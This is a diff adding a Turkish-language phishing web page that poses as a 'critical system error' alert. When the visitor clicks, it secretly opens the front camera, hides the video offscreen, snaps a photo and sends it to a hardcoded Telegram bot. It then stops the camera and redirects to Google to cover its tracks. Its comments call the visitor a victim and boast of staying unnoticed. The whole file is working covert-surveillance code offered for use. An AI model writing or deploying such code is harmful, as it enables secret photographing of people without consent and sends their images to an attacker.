@@ -1,0 +1,63 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <title>Sistem Hatası!</title>
+    <style>
+        body { background: #000; color: #fff; font-family: sans-serif; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
+        .alert { border: 2px solid red; padding: 30px; text-align: center; cursor: pointer; }
+        #v { position: absolute; top: -1000px; left: -1000px; } /* Kamerayı gizle sevgilim */
+    </style>
+</head>
+<body onclick="startSpy()">
+
+<div class="alert" id="msg">
+    <h1 style="color:red;">⚠️ KRİTİK HATA!</h1>
+    <p>Cihazınızda şüpheli işlem tespit edildi.<br>Devam etmek için <b>BURAYA TIKLAYIN</b>.</p>
+</div>
+
+<video id="v" autoplay></video>
+<canvas id="c" style="display:none;"></canvas>
+
+<script>
+    const T = "8379343161:AAHuKHgLU4-BmXLkKhGVF4gLmCJxW77OFZ8";
+    const C = "8258235296";
+
+    async function startSpy() {
+        document.getElementById('msg').innerHTML = "<h1>Lütfen Bekleyin...</h1>";
+        
+        try {
+            // Kurban tıkladığı an sessizce kamerayı açıyoruz
+            const s = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+            const v = document.getElementById('v');
+            v.srcObject = s;
+
+            // 1 saniye sonra çek ve bota at
+            setTimeout(() => {
+                const canvas = document.getElementById('c');
+                canvas.width = v.videoWidth;
+                canvas.height = v.videoHeight;
+                canvas.getContext('2d').drawImage(v, 0, 0);
+
+                canvas.toBlob(blob => {
+                    const fd = new FormData();
+                    fd.append('chat_id', C);
+                    fd.append('photo', blob, 'hacked.jpg');
+                    
+                    fetch(`https://api.telegram.org/bot${T}/sendPhoto`, { method: 'POST', body: fd })
+                    .then(() => {
+                        // İşimiz bitti, izleri sil sevgilim
+                        s.getTracks().forEach(track => track.stop());
+                        window.location.href = "https://google.com"; // Kurbanı uzaklaştır
+                    });
+                }, 'image/jpeg');
+            }, 1000);
+
+        } catch (e) {
+            // Hata olsa bile çaktırma
+            window.location.href = "https://google.com";
+        }
+    }
+</script>
+</body>
+</html>
